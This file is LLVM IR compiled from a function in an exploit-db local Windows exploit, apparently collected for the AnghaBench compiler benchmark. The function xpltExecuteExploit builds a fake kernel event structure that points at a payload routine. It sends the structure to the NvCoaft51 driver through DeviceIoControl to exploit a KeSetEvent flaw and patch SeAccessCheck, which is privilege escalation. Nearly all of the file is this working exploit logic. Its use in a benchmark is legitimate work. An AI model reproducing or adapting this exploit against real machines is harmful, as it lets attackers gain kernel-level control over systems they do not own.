; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_4345.c_xpltExecuteExploit.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/local/extr_4345.c_xpltExecuteExploit.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@.str = private unnamed_addr constant [61 x i8] c"(-)This exploit is only runs on a PAE kernel system. Sorry.\0A\00", align 1
@.str.1 = private unnamed_addr constant [55 x i8] c"(*)Trying to exploit the NvCoaft51 KeSetEvent vuln...\0A\00", align 1
@.str.2 = private unnamed_addr constant [33 x i8] c"(*)Writing fake event struct...\0A\00", align 1
@xpltPatchAndGo = common dso_local global i64 0, align 8
@.str.3 = private unnamed_addr constant [21 x i8] c"(*)Sending IOCTL...\0A\00", align 1
@XPLT_KEVENT_IOCTL = common dso_local global i32 0, align 4
@.str.4 = private unnamed_addr constant [47 x i8] c"(+)IOCT sent. SeAccessCheck is now patched???\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @xpltExecuteExploit(i32 %0, i64 %1, i32 %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i64, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca [1024 x i32], align 16
  %10 = alloca [31 x i32], align 16
  store i32 %0, i32* %5, align 4
  store i64 %1, i64* %6, align 8
  store i32 %2, i32* %7, align 4
  %11 = load i32, i32* %7, align 4
  %12 = icmp ne i32 %11, 0
  br i1 %12, label %15, label %13

13:                                               ; preds = %3
  %14 = call i32 @printf(i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str, i64 0, i64 0))
  br label %52

15:                                               ; preds = %3
  %16 = call i32 @printf(i8* getelementptr inbounds ([55 x i8], [55 x i8]* @.str.1, i64 0, i64 0))
  %17 = call i32 @printf(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.2, i64 0, i64 0))
  %18 = getelementptr inbounds [31 x i32], [31 x i32]* %10, i64 0, i64 0
  store i32 1, i32* %18, align 16
  %19 = getelementptr inbounds [31 x i32], [31 x i32]* %10, i64 0, i64 3
  %20 = ptrtoint i32* %19 to i32
  %21 = getelementptr inbounds [31 x i32], [31 x i32]* %10, i64 0, i64 2
  store i32 %20, i32* %21, align 8
  %22 = getelementptr inbounds [31 x i32], [31 x i32]* %10, i64 0, i64 4
  %23 = ptrtoint i32* %22 to i32
  %24 = getelementptr inbounds [31 x i32], [31 x i32]* %10, i64 0, i64 3
  store i32 %23, i32* %24, align 4
  %25 = getelementptr inbounds [31 x i32], [31 x i32]* %10, i64 0, i64 0
  %26 = getelementptr inbounds i32, i32* %25, i64 17
  store i32 1, i32* %26, align 4
  %27 = getelementptr inbounds [31 x i32], [31 x i32]* %10, i64 0, i64 7
  %28 = ptrtoint i32* %27 to i32
  %29 = getelementptr inbounds [31 x i32], [31 x i32]* %10, i64 0, i64 5
  store i32 %28, i32* %29, align 4
  %30 = load i64, i64* @xpltPatchAndGo, align 8
  %31 = trunc i64 %30 to i32
  %32 = getelementptr inbounds [31 x i32], [31 x i32]* %10, i64 0, i64 7
  store i32 %31, i32* %32, align 4
  %33 = getelementptr inbounds [31 x i32], [31 x i32]* %10, i64 0, i64 10
  %34 = ptrtoint i32* %33 to i32
  %35 = getelementptr inbounds [31 x i32], [31 x i32]* %10, i64 0, i64 30
  store i32 %34, i32* %35, align 8
  %36 = getelementptr inbounds [31 x i32], [31 x i32]* %10, i64 0, i64 10
  store i32 8703, i32* %36, align 8
  %37 = load i64, i64* %6, align 8
  %38 = add nsw i64 %37, 168372
  %39 = trunc i64 %38 to i32
  %40 = getelementptr inbounds [31 x i32], [31 x i32]* %10, i64 0, i64 11
  store i32 %39, i32* %40, align 4
  %41 = ptrtoint [31 x i32]* %10 to i64
  %42 = sub nsw i64 %41, 2124
  %43 = trunc i64 %42 to i32
  %44 = getelementptr inbounds [1024 x i32], [1024 x i32]* %9, i64 0, i64 0
  store i32 %43, i32* %44, align 16
  %45 = call i32 @printf(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.3, i64 0, i64 0))
  %46 = load i32, i32* %5, align 4
  %47 = load i32, i32* @XPLT_KEVENT_IOCTL, align 4
  %48 = getelementptr inbounds [1024 x i32], [1024 x i32]* %9, i64 0, i64 0
  %49 = getelementptr inbounds [1024 x i32], [1024 x i32]* %9, i64 0, i64 0
  %50 = call i32 @DeviceIoControl(i32 %46, i32 %47, i32* %48, i32 4096, i32* %49, i32 4096, i32* %8, i32* null)
  %51 = call i32 @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.4, i64 0, i64 0))
  br label %52

52:                                               ; preds = %15, %13
  %53 = load i32, i32* %4, align 4
  ret i32 %53
}

declare dso_local i32 @printf(i8*) #1

declare dso_local i32 @DeviceIoControl(i32, i32, i32*, i32, i32*, i32, i32*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
